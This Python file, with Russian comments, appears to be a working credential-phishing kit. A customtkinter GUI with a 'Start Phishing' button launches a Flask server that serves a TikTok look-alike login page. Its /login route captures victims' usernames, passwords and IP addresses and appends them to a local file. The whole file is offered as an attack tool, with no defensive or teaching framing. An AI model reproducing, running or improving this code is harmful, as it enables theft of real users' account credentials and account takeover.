import os
import threading
import signal
import customtkinter as ctk
from flask import Flask, request, render_template, redirect, url_for, jsonify

app = Flask(__name__, template_folder='templates/TIKtok')

# Глобальная переменная для отслеживания состояния сервера и события остановки
server_thread = None
server_event = threading.Event()  # Используем Event для контроля работы сервера
start_button = None
stop_button = None

# Эта функция будет запускать Flask сервер с параметрами
def start_phishing(action_url, port):
    """Запускает фишинг-атаку с заданным URL и портом."""
    app.config['action_url'] = action_url  # Сохраняем action_url в конфигурации Flask
    app.config['port'] = port  # Сохраняем порт в конфигурации Flask
    print(f"Starting phishing with Action URL: {action_url} and Port: {port}")

    # Запуск Flask-сервера в цикле, пока не получим событие для остановки
    while not server_event.is_set():
        app.run(host='0.0.0.0', port=int(port), debug=False, use_reloader=False)  # Запуск Flask-сервера
    print("Server stopped.")

# Добавьте маршрут для остановки сервера
@app.route('/shutdown', methods=['POST'])
def shutdown():
    """Останавливает Flask сервер."""
    func = request.environ.get('werkzeug.server.shutdown')
    if func is None:
        raise RuntimeError('Not running with the Werkzeug Server')
    func()
    return jsonify({"message": "Server shutting down..."})

def stop_server():
    """Останавливает Flask сервер через маршрут /shutdown."""
    import requests
    try:
        requests.post(f"http://127.0.0.1:{app.config['port']}/shutdown")
        print("Server shutdown request sent.")
    except Exception as e:
        print(f"Error stopping server: {e}")
    toggle_buttons(False)  # Скрыть кнопку "Stop Server" и показать "Start Phishing"

def clear_frame(frame):
    """Очищает все виджеты в указанном фрейме."""
    for widget in frame.winfo_children():
        widget.destroy()

def tiktok_ui(parent_frame, go_back_callback=None):
    """Создает интерфейс для TikTok."""
    global start_button, stop_button
    clear_frame(parent_frame)

    # Заголовок
    label_title = ctk.CTkLabel(parent_frame, text="TikTok", font=("Arial", 24))
    label_title.pack(pady=10)

    # Поле ввода для action_url
    label_action_url = ctk.CTkLabel(parent_frame, text="Action URL:", font=("Arial", 16))
    label_action_url.pack(pady=5)
    entry_action_url = ctk.CTkEntry(parent_frame, placeholder_text="Enter Action URL", font=("Arial", 16))
    entry_action_url.pack(pady=5)

    # Поле ввода для port
    label_port = ctk.CTkLabel(parent_frame, text="Port:", font=("Arial", 16))
    label_port.pack(pady=5)
    entry_port = ctk.CTkEntry(parent_frame, placeholder_text="Enter Port", font=("Arial", 16))
    entry_port.pack(pady=5)

    # Кнопка "Start Phishing"
    def on_start_phishing():
        # Получаем значения из полей ввода
        action_url = entry_action_url.get()
        port = entry_port.get()

        # Запускаем сервер Flask в отдельном потоке
        global server_thread
        if server_thread is None or not server_thread.is_alive():
            server_event.clear()  # Очищаем событие перед запуском
            server_thread = threading.Thread(target=start_phishing, args=(action_url, port), daemon=True)
            server_thread.start()
            toggle_buttons(True)  # Показать кнопку "Stop Server" и скрыть "Start Phishing"
        else:
            print("Server is already running.")

    start_button = ctk.CTkButton(
        parent_frame,
        text="Start Phishing",
        command=on_start_phishing,
        font=("Arial", 16),
        width=200,
        height=40
    )
    start_button.pack(pady=20)

    # Кнопка "Stop Server"
    def on_stop_server():
        stop_server()

    stop_button = ctk.CTkButton(
        parent_frame,
        text="Stop Server",
        command=on_stop_server,
        font=("Arial", 16),
        width=200,
        height=40
    )
    stop_button.pack(pady=20)
    stop_button.pack_forget()  # Изначально скрытая кнопка

    # Кнопка "Назад"
    back_button = ctk.CTkButton(
        parent_frame,
        text="← Back",
        command=lambda: go_back_callback() if go_back_callback else None,
        font=("Arial", 16),
        width=200,
        height=40
    )
    back_button.place(relx=0.5, rely=0.8, anchor="center")

def toggle_buttons(is_server_running):
    """Меняет видимость кнопок в зависимости от состояния сервера."""
    global start_button, stop_button
    start_button.pack_forget()  # Скрыть кнопку "Start Phishing"
    stop_button.pack_forget()   # Скрыть кнопку "Stop Server"

    if is_server_running:
        stop_button.pack(pady=20)  # Показать кнопку "Stop Server"
    else:
        start_button.pack(pady=20)  # Показать кнопку "Start Phishing"

# Главная страница
@app.route('/')
def index():
    return render_template('index.html')

# Страница для входа
@app.route("/login", methods=["POST"])
def login():
    action_url = request.form.get('action_url')
    port = request.form.get('port')
    username = request.form.get('username')
    password = request.form.get('password')
    user_ip = request.remote_addr

    print('Action URL:', action_url)
    print('Port:', port)
    print('User:', username)
    print('Password:', password)

    # Сохраняем данные пользователя в файл
    current_path = os.path.abspath(os.path.dirname(__file__))
    file_path = os.path.join(current_path, 'UserData/mesenger_user_data.txt')
    print(f"File path: {file_path}")

    try:
        with open(file_path, 'a', encoding='utf-8') as file:
            file.write(f"User: {username}, Password: {password}, IP: {user_ip}\n")
        print("Data successfully written to file.")
    except Exception as e:
        print(f"Error writing to file: {e}")

    # После записи данных в файл запускаем фишинг
    start_phishing(action_url, port)
    return redirect(url_for('index'))  # Можно вернуть на главную страницу после запуска

if __name__ == '__main__':
    app.run(debug=True)